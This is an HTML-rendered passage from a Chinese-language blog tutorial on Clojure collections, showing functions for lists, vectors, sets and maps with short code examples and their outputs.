&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; stooges (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;list&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Larry&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; stooges (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;quote&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Larry&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; stooges &#39;(&lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Larry&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;some&lt;br&gt;检测一个集合中是否包含某个元素，需要跟一个谓词函数和一个集合。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;some&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;=&lt;/span&gt;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt;) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;some&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;=&lt;/span&gt;&lt;/span&gt; % &lt;span class=&quot;string&quot;&gt;&quot;Mark&quot;&lt;/span&gt;) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;;在Lists搜索一个元素是线性低效的，在set里搜索就容易且高效多了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;contains?&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;set&lt;/span&gt; stooges) &lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;into&lt;br&gt;把两个集合里面的元素合并成一个新的大list&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;into&lt;/span&gt;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] [&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; [1 2 3 4]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;into&lt;/span&gt;&lt;/span&gt; &#39;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &#39;(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (6 5 4 1 2 3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Vectors&quot;&gt;&lt;a href=&quot;#Vectors&quot; class=&quot;headerlink&quot; title=&quot;Vectors&quot;&gt;&lt;/a&gt;Vectors&lt;/h3&gt;&lt;p&gt;类似于数组。这种集合对于从最后面删除一个元素，或者获取最后面一个元素是非常高效的(O(1))。这意味着对于向vector里面添加元素使用conj被使用cons更高效。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;创建&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; stooges (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;vector&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Larry&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; stooges [&lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Larry&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;get&lt;br&gt;获取vector里面指定索引的元素，从map中取value也是用的get。get 和 nth 有点类似。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; Usage: (get map key) , (get map key not-found)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;get&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;unknown&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;Larry&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;get&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;unknown&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;unknown&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;assoc&lt;br&gt;可以对 vectors 和 maps进行操作。替换指定索引的元素。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;assoc&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Shemp&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; [&quot;Moe&quot; &quot;Larry&quot; &quot;Shemp&quot;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;subvec&lt;br&gt;获取一个给定vector的子vector。&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;  ; Usage: (subvec v start) , (subvec v start end)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (subvec stooges 1) ; -&amp;gt; [&quot;Larry&quot; &quot;Curly&quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (subvec stooges 1 2) ; -&amp;gt; [&quot;Larry&quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ``` &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;### Sets&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Sets 是一个包含不重复元素的集合。Clojure 支持两种不同的set： 排序的(sorted-set)和不排序的(hash-set)。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 创建&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ```clojure&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (def stooges (hash-set &quot;Moe&quot; &quot;Larry&quot; &quot;Curly&quot;)) ; not sorted&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (def stooges #&amp;#123;&quot;Moe&quot; &quot;Larry&quot; &quot;Curly&quot;&amp;#125;) ; same as previous&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (def stooges (sorted-set &quot;Moe&quot; &quot;Larry&quot; &quot;Curly&quot;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;contains?&lt;br&gt;是否包含某元素。可以操作在set和map上。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;contains?&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;contains?&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;string&quot;&gt;&quot;Mark&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  Sets 自己也可以作为一个函数。当以这种方式来用的时候，返回值要么是这个元素，要么是nil。 这个比起contains？函数来说更简洁。&lt;/p&gt;
  &lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;stooges&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;Moe&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;stooges&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Mark&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;if&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;stooges&lt;/span&gt; person) &lt;span class=&quot;string&quot;&gt;&quot;stooge&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;regular person&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;disj&lt;br&gt;去掉给定的set里面的一些元素，返回一个新的set。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; more-stooges (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;conj&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;string&quot;&gt;&quot;Shemp&quot;&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; #&amp;#123;&quot;Moe&quot; &quot;Larry&quot; &quot;Curly&quot; &quot;Shemp&quot;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; less-stooges (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;disj&lt;/span&gt;&lt;/span&gt; more-stooges &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; #&amp;#123;&quot;Moe&quot; &quot;Larry&quot; &quot;Shemp&quot;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Maps&quot;&gt;&lt;a href=&quot;#Maps&quot; class=&quot;headerlink&quot; title=&quot;Maps&quot;&gt;&lt;/a&gt;Maps&lt;/h3&gt;&lt;p&gt;Maps 保存从key到value的a对应关系 — key和value都可以是任意对象。和set类似，map也分为排序的(sorted-hash)和不排序的(hash-map)。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;创建&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; colors (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;hash-map&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:yellow&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:blue&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:black&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; colors &amp;#123;&lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:yellow&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:blue&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:black&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&amp;#125;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &amp;#123;:red 1, :yellow 9, :blue 4, :black 3&amp;#125; 语法糖，和上面的是一样的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; colors_sort (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;sorted-map&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:yellow&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:blue&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:black&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &amp;#123;:black 3, :blue 4, :red 1, :yellow 9&amp;#125; 可以看到这是排序了的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Map可以作为它的key的函数，同时如果key是keyword的话，那么key也可以作为map的函数。下面是三种获取&lt;code&gt;:red&lt;/code&gt;所对应的值的方法。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;get&lt;/span&gt;&lt;/span&gt; colors &lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;colors&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:green&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt; colors)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;contains? &amp;amp; keys &amp;amp; vals&lt;br&gt;contains? 用来检测某个key存不存在。keys 和  vals 可以获得map中的键集合和值集合。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;contains?&lt;/span&gt;&lt;/span&gt; colos &lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;keys&lt;/span&gt;&lt;/span&gt; colors) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (:yellow :red :blue :black)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;vals&lt;/span&gt;&lt;/span&gt; colors) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (9 1 4 3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;assoc &amp;amp; dissoc&lt;br&gt;assoc 会创建一个新的map，同时添加任意对新的key-value对, 如果某个给定的key已经存在了，那么它的值会被更新。&lt;/p&gt;
&lt;p&gt;dissoc 会创建一个新的map，同时去掉了给定的那些key。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;assoc&lt;/span&gt;&lt;/span&gt; colors &lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;red&quot;&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:white&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;white&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &amp;#123;:white &quot;white&quot;, :yellow 9, :red &quot;red&quot;, :blue 4, :black 3&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dissoc&lt;/span&gt;&lt;/span&gt; colors &lt;span class=&quot;symbol&quot;&gt;:red&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:white&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &amp;#123;:yellow 9, :blue 4, :black 3&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;遍历&lt;br&gt;遍历map可以使用宏&lt;code&gt;doseq&lt;/code&gt;，把key bind到color， 把value bind到v。name函数返回一个keyword的字符串名字。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;doseq&lt;/span&gt;&lt;/span&gt; [[color v] colors]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;str&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;The value of &quot;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;name&lt;/span&gt;&lt;/span&gt; color) &lt;span class=&quot;string&quot;&gt;&quot; is &quot;&lt;/span&gt; v &lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  输出为：&lt;/p&gt;
  &lt;figure class=&quot;highlight ceylon&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;The &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; yellow &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;The &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; red &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;The &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; blue &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;The &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; black &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  或者使用&lt;a href=&quot;https://gist.github.com/john2x/e1dca953548bfdfb9844&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Destructing&lt;/a&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;内嵌&lt;br&gt;map的值也可以是一个map。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; person &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;symbol&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Mark Volkmann&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;symbol&quot;&gt;:street&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;644 Glen Summit&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;symbol&quot;&gt;:city&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;St. 